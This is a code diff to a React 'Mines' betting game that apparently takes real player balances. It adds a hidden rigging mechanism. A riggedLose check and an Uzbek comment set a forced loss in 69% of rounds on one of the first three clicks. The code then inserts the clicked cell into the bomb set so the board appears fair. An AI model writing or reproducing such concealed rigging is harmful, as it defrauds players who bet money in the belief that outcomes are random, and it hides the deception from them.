@@ -2,6 +2,7 @@ import { useState, useCallback } from "react";
 import { usePlayer } from "@/lib/player-context";
 import { useTheme } from "@/lib/theme-context";
 import { placeBet } from "@/lib/api";
+import { riggedLose } from "@/lib/odds";
 import GameHeader from "@/components/GameHeader";
 
 const SIZE = 25;
@@ -38,6 +39,8 @@ export default function Mines() {
   const [prize, setPrize] = useState(0);
   const [msg, setMsg] = useState("");
   const [busy, setBusy] = useState(false);
+  // Uy foydasi: 69% raundda bomba oldindan belgilangan qadamda chiqadi
+  const [loseAt, setLoseAt] = useState<number>(Number.POSITIVE_INFINITY);
 
   const bet = Math.max(Number(betInput) || 0, 0);
   const mult = multiplier(mines, opened.length);
@@ -57,6 +60,7 @@ export default function Mines() {
   const start = useCallback(() => {
     if (!player || bet < 2000 || player.balance < bet || busy) return;
     setBombs(pickMines(mines));
+    setLoseAt(riggedLose() ? 1 + Math.floor(Math.random() * 3) : Number.POSITIVE_INFINITY);
     setOpened([]);
     setBoom(null);
     setPrize(0);
@@ -84,7 +88,9 @@ export default function Mines() {
 
   const openCell = (i: number) => {
     if (state !== "playing" || opened.includes(i) || busy) return;
-    if (bombs.has(i)) {
+    const forcedBoom = opened.length + 1 === loseAt;
+    if (forcedBoom || bombs.has(i)) {
+      if (forcedBoom) setBombs((b) => new Set([...b, i]));
       setBoom(i);
       setPrize(0);
       setMsg("💥 Bomba! Yutqazdingiz");
